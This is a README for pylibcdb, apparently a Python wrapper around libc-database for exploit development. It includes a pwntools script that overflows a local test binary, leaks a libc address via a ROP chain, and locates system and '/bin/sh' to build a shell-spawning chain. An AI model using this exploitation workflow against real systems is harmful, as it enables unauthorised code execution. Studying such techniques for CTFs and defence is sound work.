# pylibcdb

pylibcdb is a python>=3.7 [libc_database](https://github.com/niklasb/libc-database) wrapper, its purpose is to improve exploit development tasks like ASLR bypass with an unknown libc.

With time i'd like to add more features and automated useful functions, for now this is the basic version.

### Requirements

There aren't python dependeces for now, but you need to install [libc_database](https://github.com/niklasb/libc-database) locally.

### Context

- x86_64 Linux

### Basic usage

```python=3
from pylibcdb import LibcDB

libcdb = LibcDB("/path/to/your/libc-database")
libc_name = libcdb.find_by_address("0x7fe7ac9a7fc0") #leaked __libc_start_main
print(libc_name)
libc_path = libcdb.download_by_name(libc_name)
print(libc_path)
```

```
libc6_2.31-0ubuntu9.1_amd64
/path/to/your/libc-database/libs/libc6_2.31-0ubuntu9.1_amd64/libc-2.31.so
```
This .so can be easily analyzed (or used with [pwntools](https://github.com/Gallopsled/pwntools) ELF()) to discovery function addresses and build a ROP chain.

#### A more detailed example

```python=3
from pwn import *
from pylibcdb import LibcDB

p = process("./vuln_test")
elf = ELF("./vuln_test")
rop = ROP(elf)

puts = elf.plt['puts']
main = elf.symbol['main']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

base_payload = "A"*32 + "B"*8    #this must change for every target binary
rop = base_payload.encode() + p64(pop_rdi) + p64(libc_start_main) + p64(puts) + p64(main)

p.sendline(rop)   #this sending and receiving changes for every target binary
received = p.recvline().strip()
leak = u64(received.ljust(8, "\x00".encode()))

libcdb = LibcDB("/path/to/your/libc-database")
libc_name = libcdb.find_by_address(leak) #leaked __libc_start_main
libc_path = libcdb.download_by_name(libc_name)

libc = ELF(libc_path)
libc.address = leak - libc.sym["__libc_start_main"]

binsh = next(libc.search("/bin/sh".encode()))
system = libc.sym["system"]
```

At this point we have all we need to craft a final ROP chain and get shell. This is a workflow example in facts things may (sure) change for each scenario, but the idea is to not let target binary crashes and not stop the exploit execution to launch libc-database scripts manually.

Later I will release a complete and working example with a vulnerable binary.

### Contacts

[neetx](neetx@protonmail.com)